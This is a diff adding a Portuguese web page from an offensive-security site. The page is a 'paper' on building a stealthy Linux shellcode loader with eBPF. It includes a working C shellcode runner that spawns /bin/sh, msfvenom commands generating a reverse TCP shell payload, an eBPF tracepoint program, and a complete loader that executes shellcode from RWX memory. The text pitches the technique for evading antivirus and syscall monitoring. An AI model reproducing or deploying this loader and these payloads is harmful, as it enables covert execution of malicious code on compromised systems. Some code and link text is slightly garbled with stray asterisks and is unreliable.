@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="../../css/css-paper/paper.css">
+    <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
+    <title>paper - Shellcode Loader with eBPF</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/xt256.min.css">
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/vbscript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/htmlbars.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/nginx.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/shell.min.js"></script>
+  <script>
+      hljs.highlightAll();
+    //  hljs.configure({languages: []});
+    </script>
+
+</head>
+
+<body>
+    <div class="main_container">
+        <header class="header_top">
+            <div class="left-section">
+                <a href="../../a/about.html" class="menu-link">[ 0xAb0ut-Us ]</a>
+                <a href="../../c/contribute.html" class="menu-link">[ 0xContribut3 ]</a>
+                <a href="../../w/worms.html" class="menu-link">[ 0xW0rms ]</a>
+            </div>
+            <div class="right-section">
+                <span class="glitch-text">0xPwnbuff3r</span>
+            </div>
+
+        </header>
+
+        <main class="content">
+            <h1 class="pwntitle">Shellcode Loader with eBPF</h1>
+            <article>
+                  <h1 id="introdução">Introdução</h1>
+                  <p>Nos ultimos anos, o Extended Berkeley Packet Filter
+                  (<strong>eBPF</strong>) emergiu como uma tecnologia
+                  bem poderosa dentro do <strong>kernel</strong> linux,
+                  permitidno a execução efeciente e segura de softwares
+                  customizados diretamente no <strong>kernel</strong>,
+                  sem a necessidade de modificar seu codigo fonte.
+                  Originalmente criado para o sniffing de pacotes, o
+                  <strong>eBPF</strong> evoluiu para uma plataforma de
+                  observabilidade, segurança e automação altamente
+                  versátil.</p>
+                  <p>Em paralelo, o <strong>shellcode</strong> se mantém
+                  como uma técnica clássica e ainda sim extremamente
+                  relevante dentro do "arsenal". Shellcodes são trechos
+                  compactados de código em machine lang que realizam uma
+                  ação especifica, frequentemente usada para obter
+                  shells remotos, escalar privilegios ou explorar
+                  falhas.</p>
+                  <p>Neste paper, exploramos a integração entre
+                  <strong>eBPF</strong> e <strong>shellcode</strong>
+                  loaders, um campo pouco explorado. A ideia é utilizar
+                  o <strong>eBPF</strong> para monitorar eventos do
+                  sistema (como as famosas syscalls) e a partir disso,
+                  realizar um processo de execução de
+                  <strong>shellcode</strong> diretamente na memória no
+                  <strong>user-land</strong>. Essa abordagem fornece um
+                  meio altamente stealth de executar codigos maliciosos,
+                  aproveitando do baixo overhead do
+                  <strong>eBPF</strong> e da dificuldade de detecção de
+                  shellcodes injetados dinamicamente</p>
+                  <p>A proposta deste paper é demonstrar uma prova de
+                  conceito funcional de como isso pode ser feito,
+                  explicando cada parte do processo!</p>
+                  <hr />
+                  <h1 id="1---objetivo">1 - Objetivo</h1>
+                  <p>Este paper tem como objetivo principal demonstrar
+                  uma abordagem prátiac para a integração do
+                  <strong>kernel</strong>-land e o
+                  <strong>user-land</strong>, através de dois pontos
+                  centrais:</p>
+                  <ul>
+                  <li><p>Interceptação de syscalls com
+                  <strong>eBPF</strong> -&gt; codar um programa
+                  <strong>eBPF</strong> anexado a um
+                  <strong>tracepoint</strong> do <strong>kernel</strong>
+                  para capturar eventos especificos, neste caso, a
+                  <strong>syscall</strong> <code>openat()</code>. Isso
+                  permnite monitorar em tempo real a atividade do
+                  ssitema, sem impacto significativo do desempenho, e
+                  com isolamento garantido pela sandbox do
+                  <strong>eBPF</strong></p></li>
+                  <li><p>Carregamento e execução do
+                  <strong>shellcode</strong> em memória no
+                  <strong>user-land</strong>: após a ativação via event
+                  <strong>kernel</strong>, o programa em
+                  <strong>user-land</strong> é responsável por carregar
+                  um <strong>shellcode</strong> previamente compilado
+                  para a arquitetura <code>x64_86</code> em uma região
+                  executável da memória, usando o <code>mmap()</code>
+                  (mais pra frente, neste mesmo paper, vamos falar mais
+                  sobre ela). O <strong>shellcode</strong> então é
+                  executado diretamente na memória, dispensando a
+                  necessidade de arquivos temporários ou outros
+                  artefatos detectáveis</p></li>
+                  </ul>
+                  <hr />
+                  <h1 id="2---fundamentos">2 - Fundamentos</h1>
+                  <h2 id="21---ebpf">2.1 - <strong>eBPF</strong></h2>
+                  <p>O <strong>eBPF</strong> (Extended Berkeley Packet
+                  Filter) é uma tecnologia do <strong>kernel</strong>
+                  linux que permite a execução segura de programas
+                  bytecode dentro do próprio <strong>kernel</strong>, de
+                  forma isolada e controlada. Originalmente projetado
+                  para filtragem de pacotes de rede, o
+                  <strong>eBPF</strong> evoluiu para uma plataforma
+                  generalizada capaz de monitorar e alterar o
+                  comportamento do sistema operacional em tempo real,
+                  sem necessidade de modificar ou reiniciar o
+                  <strong>kernel</strong></p>
+                  <p>Os programas <strong>eBPF</strong> são escritos em
+                  uma linguagem restrita (normalmente C compilado para
+                  bytecode BPF via LLVM/Clang) e carregados no
+                  <strong>kernel</strong> usando a interface
+                  <code>bpf()</code> ou libs como a <code>libbpf</code>.
+                  Antes da execução, esse bytecode passa por um processo
+                  rigoroso de verificação para garantir que ele não
+                  cause instabilidade ou comprometa o
+                  <strong>kernel</strong> (por exemplo verificando loops
+                  infinitos ou acessos invalidos na memória)</p>
+                  <p>Os programas <strong>eBPF</strong> podem ser
+                  anexados a diversos pontos do <strong>kernel</strong>,
+                  como tracepoints, kprobes, uprobes, cgroups, sockets e
+                  etc.. permitindo a captura e manipulação de eventos do
+                  sistema!</p>
+                  <h3
+                  id="tracepoints-sys_enter_openat-no-caso">tracepoints
+                  (sys_enter_openat no caso)</h3>
+                  <p>No exemplo deste paper, utilizamos um
+                  <strong>tracepoint</strong> no <strong>kernel</strong>
+                  chamado <code>sys_enter_openat</code>, que é disparado
+                  toda vez que um processo executa a
+                  <strong>syscall</strong> <code>openat()</code>. Esse
+                  <strong>tracepoint</strong> fornece acesso aos
+                  argumentos da <strong>syscall</strong> (como o caminho
+                  do arquivo que está sendo aberto) no momento da
+                  invocação</p>
+                  <p>Anexar um programa <strong>eBPF</strong> a esse
+                  <strong>tracepoint</strong> permite interceptar essas
+                  informações de forma eficiente e segura,
+                  possibilitando, por exemplo, monitoramento detalhado
+                  de atividades de arquivos em tempo real!</p>
+                  <h3 id="isolamento-do-ebpf">Isolamento do
+                  <strong>eBPF</strong></h3>
+                  <p>O ambiente <strong>eBPF</strong> roda em sandbox,
+                  sem acesso direto a estruturas criticas do
+                  <strong>kernel</strong>, então isso reduz o risco de
+                  falhas e mantém a estabilidade do sistema, enquanto
+                  permite que ferramentas monitorem e interajam com o
+                  <strong>kernel</strong> de forma segura e eficaz</p>
+                  <h2 id="22---shellcode">2.2 - Shellcode</h2>
+                  <p>Shellcode é um pedaço de código que faz algo
+                  específico quando executado, geralmente usado em
+                  exploits para abrir um shell, executar comandos ou
+                  baixar payloads. Apesar do nome, nem todo
+                  <strong>shellcode</strong> abre um shell. Ele pode
+                  apenas criar arquivos, conectar em rede ou executar
+                  qualquer instrução válida</p>
+                  <h3 id="como-caralhos-ele-é-executado">Como caralhos
+                  ele é executado?</h3>
+                  <p>O <strong>shellcode</strong> geralmente é injetado
+                  e executado em memória, então o processo é
+                  basicamente:</p>
+                  <ul>
+                  <li>1 -&gt; alocar memoria com permissão de execução
+                  (por exemplo: <code>mmap()</code> ou
+                  <code>malloc()</code> + <code>mprotect()</code>)</li>
+                  <li>2 -&gt; copiar o <strong>shellcode</strong> para
+                  essa memoria</li>
+                  <li>3 -&gt; criar uma função que aponta para o
+                  <strong>shellcode</strong> e chamar ela</li>
+                  </ul>
+                  <p>Bom, para exemplificar, aqui está um codigo em C
+                  bem simples que invoca uma shell sh por meio de um
+                  <strong>shellcode</strong>:</p>
+                  <pre class="c"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+
+unsigned char shellcode[] = {
+  0x48, 0x31, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0x89, 0xc6, 0x48, 0x8d, 0x3d, 0x04, 0x00, 0x00, 0x00, 0xb0, 0x3b, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
+};
+
+int main() {
+    void *mem = mmap(NULL, 4096,
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+    MAP_ANON | MAP_PRIVATE, -1, 0);
+    memcpy(mem, shellcode, sizeof(shellcode));
+    ((void(*)())mem)();
+}
+</code></pre>
+                  <h4 id="geração-com-o-msfvenom">Geração com o
+                  msfvenom:</h4>
+                  <p>Uma forma prática e rapida de gerar shellcodes é
+                  com o msfvenom, do metasploit, aqui vou deixar uns
+                  exemplos de como gerar shellcodes pelo msfvenom:</p>
+                  <p>gerar <strong>shellcode</strong> para uma reverse
+                  shell em x86_64;</p>
+                  <h3 id="arquivobash">Arquivo:"bash"</h3>
+                  <pre class="bash"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c</code></pre>
+                  <p>isso gera o <strong>shellcode</strong> em formato C
+                  para ser copiado direto no código, mas você também
+                  pode gerar um <strong>shellcode</strong> "puro" em
+                  binário desta forma:</p>
+                  <h3 id="arquivobash-1">Arquivo:"bash"</h3>
+                  <pre class="bash"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o pwnbuffer.bin</code></pre>
+                  <h2 id="23---integração-com-loader">2.3 - Integração
+                  com loader</h2>
+                  <p>Agora, levantamos uma questão: por que usar
+                  <code>mmap()</code> com <code>PROT_EXEC</code>? De
+                  forma direta, precisamos de uma região de memoria que
+                  possa executar código. O <code>mmap()</code> com
+                  <code>PROT_READ | PROT_WRITE | PROT_EXEC</code>
+                  permite alocar espaço onde copiamos o
+                  <strong>shellcode</strong> e conseguimos executar ele
+                  direto na RAM!</p>
+                  <p><strong>eBPF</strong> exige que seus mapas e
+                  programas sejam travados na memória (sem swap), então
+                  o papel do <code>RLIMIT_MEMLOCK</code> é definir
+                  quanto de memória o processo pode travar, se for muito
+                  baixo, o <code>bpf()</code> falha com
+                  <code>EPERM</code>, por isso, aumetamos esse limite
+                  com:</p>
+                  <pre class="C"><code>struct rlimit r = {RLIM_INFINITY, RLIM_INFINITY};
+setrlimit(RLIMIT_MEMLOCK, &amp;r);</code></pre>
+                  <p>Sem isso, o loader nem carrega o
+                  <strong>eBPF</strong>.</p>
+                  <hr />
+                  <h1 id="3---implementação">3 - Implementação</h1>
+                  <h2 id="31---code-ebpf-kernel-land">3.1 - Code
+                  <strong>eBPF</strong>
+                  (<strong>kernel</strong>-land)</h2>
+                  <p>O seguinte code em C define o programa
+                  <strong>eBPF</strong> que será carregado no
+                  <strong>kernel</strong> e anexado ao
+                  <strong>tracepoint</strong>
+                  <code>sys_enter_openat</code>. Esse
+                  <strong>tracepoint</strong> é acionado sempre que um
+                  processo executa a <strong>syscall</strong>
+                  <code>openat()</code> usada internamente por funções
+                  como <code>open()</code> e <code>fopen()</code></p>
+                  <pre class="C"><code>#include &lt;linux/bpf.h&gt;
+#include &lt;bpf/bpf_helpers.h&gt;
+#include &lt;linux/ptrace.h&gt;
+#include &lt;linux/types.h&gt;
+#include &lt;linux/stat.h&gt;
+
+struct trace_event {
+    __u64           pad;
+    int             dfd;
+    const char     *filename;
+    int             flags;      
+    __u32           mode;
+};
+
+char LICENSE[] SEC(&quot;license&quot;) = &quot;GPL&quot;;
+
+SEC(&quot;tracepoint/syscalls/sys_enter_openat&quot;)
+int trace_openat(struct trace_event *ctx)
+{
+    char first_byte = 0;
+    bpf_probe_read_user(&amp;first_byte,
+                       sizeof(first_byte),
+                       ctx-&gt;filename);
+
+    bpf_printk(&quot;PWNED!! %c\n&quot;, first_byte);
+    return 0;
+}</code></pre>
+                  <p>"O que o código faz?"</p>
+                  <ul>
+                  <li>intercepta chamadas para a
+                  <code>openat()</code></li>
+                  <li>lê o primeiro caractere do nome do arquivo sendo
+                  aberto</li>
+                  <li>usa <code>bpf_printk**()</code> para registrar no
+                  <code>/sys/**kernel**/debug/tracing/**trace_pipe</code></li>
+                  </ul>
+                  <p>Então, isso permite monitorar em tempo real o que
+                  está sendo acessado pelo sistema sem hooks
+                  invasivos!</p>
+                  <h2 id="32---code-loader-user-land">3.2 - Code loader
+                  (<strong>user-land</strong>)</h2>
+                  <p>O loader é o programa em <strong>user-land</strong>
+                  responsável por carregar o <strong>eBPF</strong> no
+                  <strong>kernel</strong>, e logo após, carregar e
+                  executar um <strong>shellcode</strong> diretamente da
+                  memória! Aqui está o código do loader em C:</p>
+                  <pre class="C"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/resource.h&gt;
+#include &lt;bpf/libbpf.h&gt;
+
+static void bump_memlock_rlimit(void)
+{
+    struct rlimit r = { RLIM_INFINITY, RLIM_INFINITY };
+    if (setrlimit(RLIMIT_MEMLOCK, &amp;r)) {
+        perror(&quot;setrlimit(RLIMIT_MEMLOCK)&quot;);
+        exit(1);
+    }
+}
+
+static void *load_shellcode(const char *path)
+{
+    FILE *f = fopen(path, &quot;rb&quot;);
+    if (!f) {
+        perror(&quot;fopen(shellcode)&quot;);
+        exit(1);
+    }
+    fseek(f, 0, SEEK_END);
+    size_t size = ftell(f);
+    rewind(f);
+
+    void *mem = mmap(NULL,
+                     size,
+                     PROT_READ | PROT_WRITE | PROT_EXEC,
+                     MAP_ANONYMOUS | MAP_PRIVATE,
+                     -1, 0);
+    if (mem == MAP_FAILED) {
+        perror(&quot;mmap&quot;);
+        fclose(f);
+        exit(1);
+    }
+
+    if (fread(mem, 1, size, f) != size) {
+        perror(&quot;fread(shellcode)&quot;);
+        munmap(mem, size);
+        fclose(f);
+        exit(1);
+    }
+    fclose(f);
+    return mem;
+}
+
+int main(int argc, char **argv)
+{
+    struct bpf_object *obj;
+    struct bpf_program *prog;
+    struct bpf_link *link;
+    int err;
+
+    bump_memlock_rlimit();
+    obj = bpf_object__open_file(&quot;ebpf_prog.o&quot;, NULL);
+    if (!obj) {
+        fprintf(stderr, &quot;Error: Failed to open ebpf_prog.o\n&quot;);
+        return 1;
+    }
+    err = bpf_object__load(obj);
+    if (err) {
+        fprintf(stderr, &quot;Error: Failed to load eBPF object: %d\n&quot;, err);
+        return 1;
+    }
+
+    bpf_object__for_each_program(prog, obj) {
+        link = bpf_program__attach(prog);
+        if (!link) {
+            fprintf(stderr, &quot;Error: Failed to attach eBPF program\n&quot;);
+            return 1;
+        }
+    }
+
+    printf(&quot;[+] eBPF loading and attached (tracepoint/syscalls:sys_enter_openat)\n&quot;);
+    void (*shellcode_func)() = load_shellcode(&quot;shellcode.bin&quot;);
+    printf(&quot;[+] Executing shellcode in memory...\n&quot;);
+    shellcode_func();
+
+    return 0;
+}</code></pre>
+                  <p>Mass.. o que o loader faz?</p>
+                  <ul>
+                  <li>remove limitações de lock de memória que poderiam
+                  impedir o carregamento do <strong>eBPF</strong></li>
+                  <li>carrega o arquivo compilado
+                  <code>ebpf_prog.o</code> com a função
+                  <code>bpf_object__open_file()</code></li>
+                  <li>anexa o <strong>eBPF</strong> no
+                  <strong>tracepoint</strong>
+                  <code>sys_enter_openat</code> via
+                  <code>bpf_program__attach()</code></li>
+                  <li>carrega o <strong>shellcode</strong> binário de um
+                  arquivo com o <code>mmap()</code> e permissões
+                  <code>PROT_EXEC</code></li>
+                  <li>e por fim, executa o <strong>shellcode</strong>
+                  imediatamente da memória</li>
+                  </ul>
+                  <p>Enfim, o resultado, se tudo ocorrer bem, o terminal
+                  exibirá algo como:</p>
+                  <pre class="sh"><code>[+] eBPF loading and attached (tracepoint/syscalls:sys_enter_openat)
+[+] Executing shellcode in memory...
+PWNED BY SLAYER%</code></pre>
+                  <p>Enfim, vou disponibilizar o meu github com o
+                  repositorio no final deste paper, para mais
+                  informações, junto com auxilio de execução e afins, de
+                  uma olhada no repo dele!</p>
+                  <hr />
+                  <h1 id="4---análise-de-segurança">4 - Análise de
+                  Segurança</h1>
+                  <p>A utilização do <strong>eBPF</strong> como
+                  ferramenta para carregamento e execução de shellcodes
+                  representa uma abordagem bem inovadora dentro da área
+                  de offsec. Ao emparelhar o space exec do
+                  <strong>kernel</strong> com técnicas comuns de injeção
+                  e execução de código arbitrário, o pentester ganha uma
+                  forma sofisticada de alcançar seus objetivos com
+                  discrição e eficiência. No entanto, essa abordagem vem
+                  acompanhada de limitações que precisam ser entendidas
+                  antes de sua aplicação prática!</p>
+                  <h2 id="vantagens">Vantagens:</h2>
+                  <ul>
+                  <li><p>1 - Execução direta da memória: o
+                  <strong>shellcode</strong> é lido diretamente de um
+                  arquivo binário (<code>**shellcode**.bin</code>) e
+                  mapeado para a memória utilizando a função
+                  <code>mmap()</code> com permissões
+                  <code>PROT_EXEC</code>. Isso significa que o código
+                  nunca toca o disco em formato executável, reduzindo
+                  consideravelmente a chance de ser detectado por
+                  antivírus tradicionais ou por ferramentas que
+                  monitoram arquivos executáveis temporários. Além
+                  disso, o <strong>shellcode</strong> é executado
+                  através de uma chamada direta (ponteiro de função), o
+                  que evita o uso de syscalls comuns (como
+                  <code>execve</code>) para iniciar um novo processo,
+                  dificultando sua identificação por ferramentas que
+                  monitoram syscalls.</p></li>
+                  <li><p>2 - Menor footprint: o loader em
+                  <strong>user-land</strong> é extremamente simples e
+                  pequeno. Ele apenas carrega o programa
+                  <strong>eBPF</strong> e mapeia o
+                  <strong>shellcode</strong> na memória. Isso significa
+                  que o binário pode passar despercebido em varreduras
+                  heurísticas, uma vez que sua estrutura não contém
+                  funções comuns de malware, como comunicação de rede,
+                  strings embutidas suspeitas ou chamadas de API
+                  incomuns.</p></li>
+                  <li><p>3 - Stealth via <strong>kernel</strong>-land:
+                  utilizar <strong>eBPF</strong> como ponto de entrada
+                  significa que o <strong>kernel</strong> está
+                  cooperando na execução, sem a necessidade de técnicas
+                  mais óbvias como o <code>LD_PRELOAD</code>, injeção
+                  por <code>ptrace</code>, ou modificações em libs do
+                  usuário. Além disso, interceptar syscalls (como
+                  <code>openat</code>) via <strong>tracepoint</strong>
+                  permite que ações legítimas do usuário (como abrir
+                  arquivos no terminal) sirvam como gatilhos naturais
+                  para a ativação do
+                  <strong>shellcode</strong>.</p></li>
+                  </ul>
+                  <h2 id="limitações">Limitações:</h2>
+                  <ul>
+                  <li><p>1 - Permissões elevadas
+                  (<strong>root</strong>): para carregar programas
+                  <strong>eBPF</strong> e manipular
+                  <code>RLIMIT_MEMLOCK</code>, é necessário ser
+                  <strong>root</strong> ou ter capacidades como
+                  <code>CAP_SYS_ADMIN</code>. Isso limita o uso em
+                  ambientes reais, onde a escalada de privilégio já deve
+                  ter ocorrido.</p></li>
+                  <li><p>2 - Visibilidade no <code>trace_pipe</code>:
+                  mesmo que o payload seja discreto, o uso de
+                  <code>bpf_printk**()</code> envia mensagens para
+                  <code>/sys/**kernel**/debug/tracing/**trace_pipe</code>.
+                  Se um analista estiver monitorando o
+                  <code>trace_pipe</code>, ele pode ver as strings e
+                  identificar a atividade.</p></li>
+                  <li><p>3 - Dependência de recursos do sistema: o
+                  loader depende de headers específicos do
+                  <strong>kernel</strong> e da <code>libbpf</code>, o
+                  que pode gerar problemas de compatibilidade ou
+                  facilitar a detecção em ambientes protegidos.</p></li>
+                  </ul>
+                  <hr />
+                  <h1 id="conclusão">Conclusão!</h1>
+                  <p>A combinação entre <strong>eBPF</strong> e
+                  <strong>shellcode</strong> loaders demonstra como é
+                  possível aproveitar mecanismos mais avançados do
+                  <strong>kernel</strong> linux para executar código de
+                  forma discreta e controlada. Com o
+                  <strong>eBPF</strong>, interceptamos chamadas de
+                  sistema diretamente no <strong>kernel</strong>,
+                  ativando rotinas personalizadas sem modificar arquivos
+                  no disco ou depender de hooks tradicionais. Ao
+                  carregar o <strong>shellcode</strong> em memória com o
+                  <code>mmap</code> e permissões de execução, garantimos
+                  que a execução ocorra inteiramente no
+                  <strong>user-land</strong>, sem deixar rastros
+                  evidentes no sistema. Essa técnica oferece vantagens
+                  como menor footprint, execução direta da memória e
+                  ativação baseada em eventos REAIS do sistema. Apesar
+                  de exigir permissões elevadas como
+                  <strong>root</strong>, e poder ser monitorada com
+                  ferramentas apropriadas, ela exemplifica o potencial
+                  do <strong>eBPF</strong> não apenas como ferramenta de
+                  observabilidade e segurança, mas também como mecanismo
+                  para automação e controle de fluxos de execução</p>
+                  <hr />
+                  <h3 id="source-github">Source github</h3>
+                  <ul>
+                  <li><a
+                  href="https://github.com/slayerkkkk/ebpf_loader">ebpf_loader
+                  - github</a></li>
+                  </ul>
+                  <h3
+                  id="fontes-utilizadas-para-construir-este-artigo">Fontes
+                  utilizadas para construir este artigo</h3>
+                  <ul>
+                  <li><a
+                  href="https://docs.**kernel**.org/bpf/index.html">Linux
+                  Kernel Documentation - <strong>eBPF</strong></a></li>
+                  <li><a
+                  href="https://man7.org/linux/man-pages/man2/bpf.2.html">bpf(2)
+                  - Linux <strong>syscall</strong> manual</a></li>
+                  <li><a
+                  href="https://github.com/**libbpf**/**libbpf**"><strong>libbpf</strong>:
+                  BPF CO-RE reference and usage</a></li>
+                  <li><a
+                  href="http://www.brendangregg.com/blog/2019-01-01/learn-ebpf-tracing.html">tracepoints
+                  in <strong>eBPF</strong> - Brendan Gregg</a></li>
+                  <li><a
+                  href="https://docs.**kernel**.org/trace/tracepoints.html">Understanding
+                  Tracepoints — Kernel docs</a></li>
+                  <li><a
+                  href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">RLIMIT_MEMLOCK
+                  - getrlimit(2)</a></li>
+                  <li><a
+                  href="https://man7.org/linux/man-pages/man2/**mmap**.2.html"><strong>mmap</strong>(2)
+                  - Memory mapping</a></li>
+                  <li><a
+                  href="https://man7.org/linux/man-pages/man2/ptrace.2.html">ptrace(2)
+                  and ptrace-based introspection</a></li>
+                  <li><a
+                  href="https://lwn.net/Articles/740157/"><strong>eBPF</strong>
+                  Security Model (LWN)</a></li>
+                  <li><a href="https://ebpf.io/what-is-ebpf/">The
+                  <strong>eBPF</strong> Handbook (by Quentin
+                  Monnet)</a></li>
+                  </ul>
+            </article>
+            
+            <a href="/PwnBuffer/index.html" class="back-link">← Voltar para a página principal</a>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <span>&copy; 2025 - pwnbuffer.org </span>
+                <span class="footer-separator">|</span>
+                <a href="https://www.freebsd.org/" target="_blank" class="footer-link">[ Discord ]</a>
+                <span class="footer-separator">|</span>
+                <a href="https://github.com/" target="_blank" class="footer-link">[ X ] </a>
+        </footer>
+    </div>
+
+</body>
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        const els = document.querySelectorAll(".glitch-text, .pwntitle");
+        const chars = "\u0025\u0023\u0024\u0040\u005E\u0026\u002A\u0021\u003F\u003C\u002D\u003E\u002B\u007C\u002A";
+
+        els.forEach(el => {
+            const originalText = el.textContent;
+
+            function glitchEffect() {
+                let iterations = 0;
+                const interval = setInterval(() => {
+                    el.textContent = originalText
+                        .split("")
+                        .map((letter, index) => {
+                            if (index < iterations) {
+                                return originalText[index];
+                            }
+                            return chars[Math.floor(Math.random() * chars.length)];
+                        })
+                        .join("");
+
+                    iterations += 1 / 2;
+
+                    if (iterations >= originalText.length) {
+                        clearInterval(interval);
+                        el.textContent = originalText;
+                    }
+                }, 50);
+            }
+
+            setInterval(glitchEffect, 12000);
+        });
+    });
+</script>
+
+</html>
